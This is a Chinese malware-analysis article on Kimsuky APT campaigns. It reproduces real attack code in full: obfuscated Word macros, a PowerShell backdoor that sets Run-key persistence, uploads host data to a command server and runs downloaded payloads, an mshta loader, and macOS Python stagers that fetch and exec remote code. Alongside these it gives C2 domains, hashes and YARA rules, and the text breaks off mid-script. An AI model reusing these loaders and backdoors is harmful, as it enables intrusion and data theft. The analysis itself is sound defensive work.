> 原文链接: https://www.anquanke.com//post/id/219593 


# KimSuky各类攻击手法浅析


                                阅读量   
                                **134928**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t018d88ba34fcd143eb.jpg)](https://p0.ssl.qhimg.com/t018d88ba34fcd143eb.jpg)



## 0x00 概述

KimSuky是总部位于朝鲜的APT组织，根据卡巴的情报来看，至少2013年就开始活跃至今。该组织专注于针对韩国智囊团以及朝鲜核相关的目标。

KimSuky的ATT&amp;CK图如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cb66793158d14cb4.png)

根据Mitre的ATTCK可以知道，KimSuky攻击的第一阶段基本是通过鱼叉攻击完成的，和大多数攻击的第一阶段相同，KimSuky的前置攻击也分为附件和邮件链接两种。

鱼叉攻击之后，紧接着是powershell的命令执行。根据笔者分析到的样本来看，附件攻击也好，链接攻击也好，大多数都是诱导用户下载并打开带有恶意宏代码的office文档执行恶意宏。恶意宏代码执行之后，通常会解密执行一段powershell指令进行后续的payload下载。

后续payload下载之后，KimSuky通常会通过注册表、启动目录、服务、注入Explorer等方式实现本地持久化。

此外，根据已有的样本来看，KimSuky还具备了关闭系统防火墙、禁用WindowsDefender、枚举磁盘等用于对抗检测的功能，具备删除已收集的数据文件的痕迹清理功能。

当一切准备方案就绪之后，KimSuky的马主要是窃取各大Web浏览器的凭证以及使用基于Powershell的键盘记录器收集用户的键盘输入。

关于数据加密，KimSuky主要是使用了RC4算法保护自己的数据。

关于命令分发，KimSuky拥有传统C2和魔改Teamview两种命令分发方式。



## 0x01 诱饵分析

根据红雨滴的Digital_Weapon和笔者之前接触到记录的KimSuky来看，部分具有诱惑性的文件名如下：

[![](https://p5.ssl.qhimg.com/t0154bbbf36c95c05ff.png)](https://p5.ssl.qhimg.com/t0154bbbf36c95c05ff.png)

针对这些诱饵文件，中文翻译得到的词云大致如下：

[![](https://p0.ssl.qhimg.com/t0116cbdbed05fe819b.png)](https://p0.ssl.qhimg.com/t0116cbdbed05fe819b.png)



## 0x02 样本分析

### <a class="reference-link" name="doc%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"></a>doc样本分析

原始样本md5为：772a5abc0e946230a50628db4a08dd80

上传VT的文件名为：학술회의 개최.doc<br>
译为：召开学术会议.doc

原始样本是一个带密码保护的office宏文档，和之前的一样，这里主要是解密执行一段Powershell代码：

[![](https://p4.ssl.qhimg.com/t016fded20e22ce77a4.png)](https://p4.ssl.qhimg.com/t016fded20e22ce77a4.png)

完整宏代码如下

```
Sub AutoOpen()
    asfwefsadfasfsadf
    dsfweqfasdfwqfsdaf
    asfwqfasfsdafas
    sdfqefsdafsadfwqefsadf
End Sub


Function dsfweqfasdfwqfsdaf()
    Dim qewrtredf(10) As String
    Dim vbNormalFocus As Integer
    vbNormalFocus = Right(Left("jfsklfkshsdf023jkjffkjfkjisfj23", 13), 1)
    qewrtredf(1) = "$+DC$+D:$+D\$+DW$+Di$+Dn$+Dd$+Do$+Dw$+Ds$+D\$+DS$+Dy$+Ds$+DW$+DO$+DW$+D$+D6$+D4$+D\$+DW$+Di$+Dn$+Dd$+Do$+Dw$+Ds$+DP$+Do$+Dw$+D$+De$+Dr$+DS$+Dh$+De$+Dl$+Dl$+D$+D\$+Dv$+D1$+D.$+D0$+D\$+Dp$+D$+Dow$+De$+Dr$+D$+Ds$+Dh$+De$+Dl$+Dl$+D.$+De$+Dx$+De$+D $+D-$+DW$+Di$+Dn$+Dd$+Do$+Dw$+DS$+Dt$+Dy$+Dl$+De"
    qewrtredf(2) = "$+D $+DH$+Di$+Dd$+Dd$+De$+Dn$+D $+D-$+Dc$+Do$+Dm$+Dm$+Da$+Dn$+Dd$+D $+D&amp;$+D`{`$+D[$+Ds$+Dt$+Dr$+Di$+Dn$+Dg$+D]$$+Da$+D"
    qewrtredf(3) = "=$+D`{`$+D($+DN$+De$+Dw$+D-$+DO$+Db$+Dj$+De$+Dc$+Dt$+D $+DN$+De$+Dt$+D.$+DW$+De$+Db$+DC$+Dl$+Di$+De$+Dn$+Dt$+D)$+D."
    qewrtredf(4) = "$+DD$+Do$+D($+D'h$+Dt$+Dt$+Dp$+D:$+D/$+D/$+Dg$+Do$+Dl$+Dd$+Db$+Di$+Dn$+D.$+Dm$+Dy$+Da$+Dr$+Dt$+Ds$+Do$+Dn$+Dl"
    qewrtredf(5) = "$+Di$+Dn$+De$+D.$+Dc$+Do$+Dm$+D/$+Dl$+De$+D/$+Dyj$+D.$+Dt$+Dx$+Dt'$+D)"
    qewrtredf(6) = "$+D`}`$+D;$+D$$+Db$+D=$+D$$+Da$+D.$+Di$+Dn$+Ds$+De$+Dr$+Dt$+D($+D2$+D9$+D,$+D'$+Dw$+Dn$+Dl$+Do$+Da$+Dd$+DS$+Dt$+D"
    qewrtredf(7) = "r$+Di$+Dn$+Dg$+D'$+D)$+D;$+D$$+Dc$+D=$+Di$+De$+Dx$+D $+D$$+Db$+D;$+Di$+De$+Dx$+D $+D$$+Dc$+D`}`"
    iefkdfknfk = qewrtredf
    wrewsdfdsfsad = Join(iefkdfknfk, "")
    wrewsdfdsfsad = Replace(wrewsdfdsfsad, "$+D", "")
    qwersdfjoi = Shell(wrewsdfdsfsad, vbNormalFocus)
End Function

Function asfwefsadfasfsadf()
  Selection.Delete Unit:=wdCharacter, Count:=1
End Function

Function asfwqfasfsdafas()
    Selection.WholeStory
    With Selection.Font
        .NameFarEast = "讣篮 绊雕"
        .NameAscii = ""
        .NameOther = ""
        .Name = ""
        .Hidden = False
    End With
End Function

Function sdfqefsdafsadfwqefsadf()
    With Selection.ParagraphFormat
        .LeftIndent = CentimetersToPoints(2)
        .SpaceBeforeAuto = True
        .SpaceAfterAuto = True
    End With
    With Selection.ParagraphFormat
        .RightIndent = CentimetersToPoints(2)
        .SpaceBeforeAuto = True
        .SpaceAfterAuto = True
    End With
    Selection.PageSetup.TopMargin = CentimetersToPoints(2.5)
    Selection.PageSetup.BottomMargin = CentimetersToPoints(2.5)
End Function
```

解密执行的Powershell指令如下

```
"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -command &amp;`{`[string]$a=`{`(New-Object Net.WebClient).Do('http://goldbin.myartsonline.com/le/yj.txt')`}`;$b=$a.insert(29,'wnloadString');$c=iex $b;iex $c`}`"
```

这里可以看到，Powershell的主要功能为下载一个文件到本地执行，下载文件的链接为：<br>
hxxp[:]//goldbin.myartsonline.com/le[/]yj.txt’

下载的yj.txt文件实质上是一个Powershell脚本，内容如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f22e1f64194cff76.png)

```
$SERVER_ADDR = "http://goldbin.myartsonline.com/le/"
$UP_URI = "post.php"
$upName = "yj"
$LocalID = "yj"
$LOG_FILENAME = "Alzip.hwp"
$LOG_FILEPATH = "\Alzip\"
$TIME_VALUE = 1000*60*30
$RegValueName = "Alzipupdate"
$RegKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regValue = "cmd.exe / c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://goldbin.myartsonline.com/le/yj.txt')"
function decode($encstr)
$key = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6)
$len = $encstr.Length
$j = 0
$i = 0
$comletter = ""
while($i -lt $len)
$j = $j % 160
$asciidec = $encstr[$i] -bxor $key[$j]
$dec = [char]$asciidec
$comletter += $dec
return $comletter
function UpLoadFunc($logpath)
$Url = $SERVER_ADDR + $UP_URI
$bReturn = $True
$testpath = Test-Path $logpath
if($testpath -eq $False)
return $bReturn
$hexdata = [IO.File]::ReadAllText($logpath)
$encletter = decode $hexdata
$nEncLen = $encletter.Length
$LF = "
$templen = 0x100000
$sum = 0
$szOptional = ""
$pUploadData = ""
Start-Sleep -Milliseconds 100
$readlen = $templen
if (($nEncLen - $sum) -lt $templen)
$readlen = $nEncLen - $sum
if ($readlen -ne 0)
$pUploadData = $encletter + $sum
$sum += $readlen
$pUploadData += "ending"
$sum += 9
$readlen = 6
Start-Sleep -Milliseconds 1
$boundary = "----WebKitFormBoundarywhpFxMBe19cSjFnG"
$ContentType = 'multipart/form-data
boundary=' + $boundary
$bodyLines = (
"--$boundary",
"Content-Disposition: form-data
name=
"MAX_FILE_SIZE
"$LF",
"10000000",
"userfile
filename=
"$upName
"Content-Type: application/octet-stream$LF",
$pUploadData,
"--$boundary"
) -join $LF
$psVersion = $PSVersionTable.PSVersion
$r = [System.Net.WebRequest]::Create($Url)
$r.Method = "POST"
$r.UseDefaultCredentials = $true
$r.ContentType = $ContentType
$enc = [system.Text.Encoding]::UTF8
$data1 = $enc.GetBytes($bodyLines)
$r.ContentLength = $data1.Length
$newStream = $r.GetRequestStream()
$newStream.Write($data1, 0, $data1.Length)
$newStream.Close()
if($php_post -like "ok")
echo "UpLoad Success
echo "UpLoad Fail
$bReturn = $False
`}` while ($sum -le $nEncLen)
function FileUploading($upPathName)
$bRet = $True
$testpath = Test-Path $upPathName
return $bRet
$UpL = UpLoadFunc $upPathName
if($UpL -eq $False)
$bRet = $False
echo "Success
del $upPathName
function Download
$downname = $LocalID + ".down"
$delphppath = $SERVER_ADDR + "del.php"
$downpsurl = $SERVER_ADDR + $downname
$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
$comletter = decode $codestring
$decode = $executioncontext.InvokeCommand.NewScriptBlock($comletter)
$RunningJob = Get-Job -State Running
if($RunningJob.count -lt 3)
$JobName = $RunningJob.count + 1
Start-Job -ScriptBlock $decode -Name $JobName
$JobName = $RunningJob.count
Stop-Job -Name $RunningJob.Name
Remove-Job -Name $RunningJob.Name
$down_Server_path = $delphppath + "
filename=$LocalID"
$response = [System.Net.WebRequest]::Create($down_Server_path).GetResponse()
$response.Close()
function Get_info($logpath)
Get-ChildItem ([Environment]::GetFolderPath("Recent")) &gt;&gt; $logpath
dir $env:ProgramFiles &gt;&gt; $logpath
dir "C:\Program Files (x86)" &gt;&gt; $logpath
systeminfo &gt;&gt; $logpath
tasklist &gt;&gt; $logpath
function main
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
$FilePath = $env:APPDATA + $LOG_FILEPATH
New-Item -Path $FilePath -Type directory -Force
$szLogPath = $FilePath + $LOG_FILENAME
$key = Get-Item -Path $RegKey
$exists = $key.GetValueNames() -contains $RegValueName
if($exists -eq $False)
$value1 = New-ItemProperty -Path $RegKey -Name $RegValueName
Get_info $szLogPath
while ($true)
FileUploading $szLogPath
Start-Sleep -Milliseconds 10000
Download
Start-Sleep -Milliseconds $TIME_VALUE

```

其中包含了KimSuky常用的协议：$boundary = “——WebKitFormBoundarywhpFxMBe19cSjFnG”

格式化一下这段Powershell代码，可以发现定义了如下几个函数：<br>
decode 用于解码<br>
UpLoadFunc 上传数据<br>
FileUploading 调用UpLoadFunc进行上传<br>
Download 下载文件到本地执行<br>
Get_info 获取当前计算机的一些基本信息<br>
main 主函数

主函数中的调用逻辑如下

```
function main
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
    $FilePath = $env:APPDATA + $LOG_FILEPATH
    New-Item -Path $FilePath -Type directory -Force
    $szLogPath = $FilePath + $LOG_FILENAME
    $key = Get-Item -Path $RegKey
    $exists = $key.GetValueNames() -contains $RegValueName
    if($exists -eq $False)
        $value1 = New-ItemProperty -Path $RegKey -Name $RegValueName
        Get_info $szLogPath
    while ($true)
        FileUploading $szLogPath
        Start-Sleep -Milliseconds 10000
        Download
        Start-Sleep -Milliseconds $TIME_VALUE
```

在main函数中，程序首先会判断是否存在目标的Run键值，如果不存在则将自身写入到Run键值中，实现本地持久化。

接着程序会通Get_info函数获取计算机的基本信息比如ProgramFiles下的文件信息、Program File (x86)下的文件信息、Systeminfo信息、Tasklist等等，写入到预定义好的%APPDATA%\Alzip\Alzip.hwp 中

然后通过一个永真循环，一边将本地收集到的信息通过FileUploading上传到指定的C2：<br>
hxxp[:]//goldbin.myartsonline.com/le/post.php

一边调用Download方法尝试从C2下载后续payload到本地继续执行。

download函数中的delphppath路径为:<br>[http://goldbin.myartsonline.com/le/del.php](http://goldbin.myartsonline.com/le/del.php)

后续payload的下载路径为：<br>[http://goldbin.myartsonline.com/le/yj.down](http://goldbin.myartsonline.com/le/yj.down)

然后程序通过WebClient的方式建立连接下载yj.down到本地并通过decode函数进行解码。解码之后通过InvokeCommand进行执行。

应该是由于样本在Twitter上被公布，攻击者目前已经关闭了该服务器的服务。<br>
所以只能从其他地方寻找后续。

顺便补充一个针对此powershell的yara规则

```
import "pe"
rule KimSuky_Ps_Backdoor
`{`
    meta:
        description = "powershell backdoor"
        author = "p1ut0"
        date = "2020-10-12"
        reference = "https://twitter.com/cyberwar_15/status/1315160377156460544"
        hash = "772a5abc0e946230a50628db4a08dd80"

    strings:
        $url_string1 = "$downname = $LocalID + \".down\""   fullword ascii

        $url_execPs = "cmd.exe / c powershell.exe -windowstyle hidden IEX"

        $file_op1 = "dir $env:ProgramFiles &gt;&gt; $logpath" fullword ascii
        $file_op2 = "dir \"C:\\Program Files (x86)\" &gt;&gt; $logpath"   fullword ascii
        $file_op3 = "systeminfo &gt;&gt; $logpath"    fullword ascii
        $file_op4 = "tasklist &gt;&gt; $logpath"  fullword ascii
    condition:
        (
            uint16(0) != 0x5A4D
        )
        and
        (
            all of ($url_*) 
        )
        and 
        (
            2 of ($file_*) 
        )
`}`
```

### <a class="reference-link" name="%E6%96%AD%E9%93%BE%E8%A1%A5%E5%85%85"></a>断链补充

根据Powershell脚本的一些特点，依托搜索引擎和VT找到了一批日期相近的样本。

其中C2分别为

[http://pingguo5.atwebpages.com/nu/](http://pingguo5.atwebpages.com/nu/)<br>[http://attachchosun.atwebpages.com/leess1982/](http://attachchosun.atwebpages.com/leess1982/)<br>[http://dongkuiri.atwebpages.com/venus02/venus03/](http://dongkuiri.atwebpages.com/venus02/venus03/)<br>[http://goldbin.myartsonline.com/le/](http://goldbin.myartsonline.com/le/)<br>[http://pootball.getenjoyment.net/ad/](http://pootball.getenjoyment.net/ad/)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e671abf5f2e12a0e.png)

很遗憾的是目前所有的这些域名对应的下载文件，全部都已经403了。

于是尝试使用里面下载文件的关键字加上KimSuky进行搜索，找到了早些时候ESTSecurity对KimSuky的分析报告，里面提到了mo.down这个文件，是由mo.txt文件通过C2服务器接收然后解码的文件，ESTSecurity指出该文件和ph.down文件解码后分别对应下面的两个exe文件。

[![](https://p4.ssl.qhimg.com/t014261aee9659ed000.png)](https://p4.ssl.qhimg.com/t014261aee9659ed000.png)

两个exe文件的文件名分别为：<br>
• [남북연합 구상과 추진방안] 워크숍 계획.hwp (다수의 공백 포함) .exe<br>
• 0730 워크숍2회의 발표문이상신_오창룡.hwp (다수의 공백 포함) .exe

除此之外，根据DNS解析，可以发现这些域名目前都指向在保加利亚的服务器：<br>
185.176.43.*

同时，可以发现KimSuky至少从19年7月开始就开始使用此Powershell版本作为攻击的前置阶段：

[![](https://p3.ssl.qhimg.com/t0183d0a7f9acfc4515.png)](https://p3.ssl.qhimg.com/t0183d0a7f9acfc4515.png)

在ESTSecurity对KimSuky的分析报告中还有这样一张图：

[![](https://p2.ssl.qhimg.com/t017386c12e7f436e9d.png)](https://p2.ssl.qhimg.com/t017386c12e7f436e9d.png)

其中dongkuiri和pingguo5两个域名刚才已经收集到了。<br>
值得注意的是foxonline123这个域名，可以看到该域名2019年7月份就出现过一次，在前段时间(2020年7月)又出现了一次

说明foxonlin123这个域名是长久使用的，于是使用该域名作为关键字去VT进行搜索

[![](https://p2.ssl.qhimg.com/t018ce0336517708ae8.png)](https://p2.ssl.qhimg.com/t018ce0336517708ae8.png)

这里可以看到几个关键点
1. 除了185.176.43.** 这个域，貌似185.176.40.**这个域也是KimSuky所拥有的
1. 这里关联了两个exe文件，上传VT时间分别为2020-10-06和2020-08-14
1. 该域名关联的两个请求的URL，请求格式与上面分析的样本比较类似。
且这里可以看到，对应的两个文件，就是上面ESTSecurity报告中提到的两个文件。这两个exe的md5分别是<br>
ffff18fc7c2166c2a1a3c3d8bbd95ba1<br>
dd15c9f2669bce96098b3f7fa791c87d

基本可以确定是此类攻击的后续文件，应该可以补上断链的地方。

### <a class="reference-link" name="%E5%90%8E%E7%BB%ADPE%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90"></a>后续PE对比分析

分别将

ffff18fc7c2166c2a1a3c3d8bbd95ba1<br>
dd15c9f2669bce96098b3f7fa791c87d

下载回来。<br>
两个文件结构基本相同

[![](https://p4.ssl.qhimg.com/t01d46f964a77798543.png)](https://p4.ssl.qhimg.com/t01d46f964a77798543.png)

程序会尝试读取解密名为JUYFON的资源文件，该资源名跟笔者前段时间分析的一例KimSuky资源名相同，于是找到了原样本跟此样本进行对比，发现是同一版本的木马。

这里的JUYFON实际上是一个诱惑用户的文档，程序会读取并打开该文档，迷惑用户。

接着收集本地的一些信息写入到docx文档中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01317cd0b4378e8b21.png)

最后通过CreateThread方法启动一个新线程，将数据上传到C2服务器。

直接将资源dump出来，可以看到两个资源都是hwp的文档，并且两个文档所描述的主题一致，应该是一起攻击中的不同攻击载荷。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013e12d7f666781796.png)

而根据之前的分析，该exe其实是一个downloader，后续会下载一个dll到本地继续执行，但目前为止，还没有及时下载到后续的dll文件。

由于在VT上找不到这个dll，笔者又将目标投入到搜索引擎，在google中将请求路径和KimSuky作为关键字组合搜索后，在得到的结果中筛选了如下一篇分析报告：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0141ec56eb9eae867b.png)

报告中的请求路径与该exe的请求路径基本符合，且在文末给出了dll文件的md5。通过查询报告中给的域名，得到了与之前分析相同的域：185.176.43.84，这里基本可以确定报告中的dll就是这里断链的文件。

### <a class="reference-link" name="%E6%8A%A5%E5%91%8A%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5exe%E5%88%86%E6%9E%90"></a>报告中的第二阶段exe分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e897f8cf587698e0.png)

该exe 的WinMain很简单，首先是创建互斥体，然后是通过一个线程循环查找gswin32c.exe的窗口句柄，接着初始化一些需要使用的API，最后创建一个线程执行关键功能。

创建的sub_402660线程虽然代码结构和笔者之前分析的不相同，但是功能基本保持一致。都是收集信息写入文件上传，然后下载文件到本地

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01eb975d146bce2991.png)

这里下载的文件就是zyx.dll。

可以推算，该样本应该是KimSuky第二阶段早期的Downloader，笔者上次分析的应该是第二阶段新版本的Downloader。因为该样本并不具备读取资源打开迷惑用户的功能。且代码结构相对比较简单。

因此，这里下载回来的zyx.dll 即使跟我们想要找的有所出入，但也应该是早期版本。

下载回来发现是VMP保护的，分析不动，于是放弃。

补充一个针对exe的downloader的简单yara规则,主要是靠WebKitFormBoundarywhpFxMBe19cSjFnG进行识别

```
rule KimSuky_Downloader
`{`
    meta:
        description = "pe dowbnloader"
        author = "p1ut0"
        date = "2020-10-12"
        reference = "https://twitter.com/cyberwar_15/status/1315160377156460544"
        hash = "ffff18fc7c2166c2a1a3c3d8bbd95ba1"

    strings:
        $url_string1 = "WebKitFormBoundarywhpFxMBe19cSjFnG"   fullword ascii


        $file_op1 = "/c systeminfo &gt;&gt; %s" fullword ascii
        $file_op3 = "/c dir %s\\ &gt;&gt; %s" fullword ascii
        $file_op2 = "\\Microsoft\\HNC"   fullword ascii
        $file_resName  = "JUYFON"

    condition:
        (
            uint16(0) == 0x5A4D
        )
        and
        (
            $url_string1
        )
        and 
        (
            3 of ($file_*) 
        )
`}`
```

### <a class="reference-link" name="%E9%99%84%E5%B8%A6hta%E7%9A%84doc%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"></a>附带hta的doc样本分析

样本md5：A9DAC36EFD7C99DC5EF8E1BF24C2D747<br>
该doc是2月份KimSuky利用疫情对韩国进行网络攻击的样本。红雨滴在 [COVID-19 | 新冠病毒笼罩下的全球疫情相关网络攻击分析报告](https://twitter.com/cyberwar_15/status/1232989735011794945)中对该样本有概要的分析。

使用olevba分析下样本的宏代码如下：

[![](https://p1.ssl.qhimg.com/t01833c93059eb9620d.png)](https://p1.ssl.qhimg.com/t01833c93059eb9620d.png)

olevba分析到了一个完整的请求路径[http://vnext.mireene.com/theme/basic/skin/member/basic/upload/search.hta](http://vnext.mireene.com/theme/basic/skin/member/basic/upload/search.hta)

dump出来的完整vba代码如下

```
Const wwfxmpquap = 0
Private Function uvwycgyhqtmt(ByVal zjkvoxjeyiqc As String) As String

Dim tkwzqharcnkh As Long
For tkwzqharcnkh = 1 To Len(zjkvoxjeyiqc) Step 2
uvwycgyhqtmt = uvwycgyhqtmt &amp; Chr$(Val("&amp;H" &amp; Mid$(zjkvoxjeyiqc, tkwzqharcnkh, 2)))
Next tkwzqharcnkh
End Function

Sub psjmjmntntn(kmsghjrsxteynvkbz As String)
With CreateObject(uvwycgyhqtmt("5753637269") &amp; uvwycgyhqtmt("70742e5368656c6c"))
.Run kmsghjrsxteynvkbz, wwfxmpquap, True
End With
End Sub

Sub AutoOpen()
With ActiveDocument.Background.Fill
.ForeColor.RGB = RGB(255, 255, 255)
.Visible = msoTrue
.Solid
End With
Selection.WholeStory
Content = uvwycgyhqtmt("6d7368746120687474703a2f2f766e6578742e6d697265") &amp; uvwycgyhqtmt("656e652e636f6d2f7468656d652f62617369632f736b696e2f6d656d6265722f62617369632f75706c6f61642f7365617263682e687461202f66")
Selection.Font.Hidden = False
psjmjmntntn (Content)
Selection.Collapse
ActiveDocument.Save
End Sub
```

这里很明显uvwycgyhqtmt是解密函数，解密函数的定义在vba代码最上面

解密出在olevba里面看到的下载地址

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017bc5e24f2654846b.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014c2bc5e0e4ae17fa.png)

然后在psjmjmntntn函数中通过Wscript.Shell调用mshta 执行后面的代码下载后续payload到本地继续执行。

Search.hta文件下载之后将再次获取hta文件执行：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01194e8ae5744b6204.png)

这里再次下载的文件是包含了恶意VBS的hta。

该hta文件将实现收集本地主机基本信息包括主机名、用户名、ip、遍历磁盘、进程list等并创建计划任务定时获取命令执行：<br>[![](https://p1.ssl.qhimg.com/t012eb07cd1af340c90.png)](https://p1.ssl.qhimg.com/t012eb07cd1af340c90.png)

在此样本的分析中，KimSuky主要是通过宏下载执行hta文件，通过该hta文件继续下载并执行包含了恶意VBS的hta文件。

以该样本的请求主域名vnext.mireene.com作为关键字进行查询可以得到如下信息：

[![](https://p1.ssl.qhimg.com/t0121cfacd54d42e196.png)](https://p1.ssl.qhimg.com/t0121cfacd54d42e196.png)

mireene是韩国地区的一个托管域名机构。属于第三方域名，所以只能对已经出现的与KimSuky样本通信的mireene进行关联，不能直接与该主域关联。

### <a class="reference-link" name="%E9%92%88%E5%AF%B9macOS%E7%9A%84doc%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"></a>针对macOS的doc样本分析

在分析上一个样本搜搜vnext.mireene.com域名的时候，在Twitter的评论中还看到了另外一个关联的样本：

[![](https://p2.ssl.qhimg.com/t01041a3bd0a49e5025.png)](https://p2.ssl.qhimg.com/t01041a3bd0a49e5025.png)

样本MD5为a4388c4d0588cd3d8a607594347663e0，在Twitter的发布时间是3月19日，C2:crphone.mireene[.]com

原始的doc文件是一个包含了2017-0199远程模板注入漏洞的恶意文档，文档打开时，会尝试从<br>[http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web](http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web)<br>
下载注入的文档

[![](https://p3.ssl.qhimg.com/t013ab5499ef06733f8.png)](https://p3.ssl.qhimg.com/t013ab5499ef06733f8.png)

注入的文件是一个带有宏代码的doc文档，该宏执行后，先是会在原始文档中显示诱饵文字，降低用户的防备心。

[![](https://p4.ssl.qhimg.com/t013511c137976fefc8.png)](https://p4.ssl.qhimg.com/t013511c137976fefc8.png)

接着判断当前系统是否为macos，如果是，VBA则会通过管道执行python代码并从指定的地址下载文件加载执行。

通过github找到了对应的python代码<br>
下载回来的python代码功能比较简单，本质还是一个downloader，用于下载后续的payload

```
## contents of http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v1:
import os;
import posixpath;
home_dir = posixpath.expandvars("$HOME");
normal_dotm = home_dir + "/../../../Group Containers/UBF8T346G9.Office/User Content.localized/Templates.localized/normal.dotm"
os.system("rm -f '" + normal_dotm + "'");
fd = os.open(normal_dotm,os.O_CREAT | os.O_RDWR);
import urllib2;
data = urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=normal')).read()
os.write(fd, data);
os.close(fd)
exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60')).read())
```

下载的后续payload依旧是python文件，代码如下

```
## contents of http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60
import os
import posixpath
import time
import urllib2
import threading
from httplib import *

def CollectData():
    #create work directory
    home_dir = posixpath.expandvars("$HOME")
    workdir = home_dir + "/../../../Group Containers/UBF8T346G9.Office/sync"
    os.system("mkdir -p '" + workdir + "'")

    #get architecture info
    os.system("python -c 'import platform;print(platform.uname())' &gt;&gt; '" + workdir + "/arch.txt'")
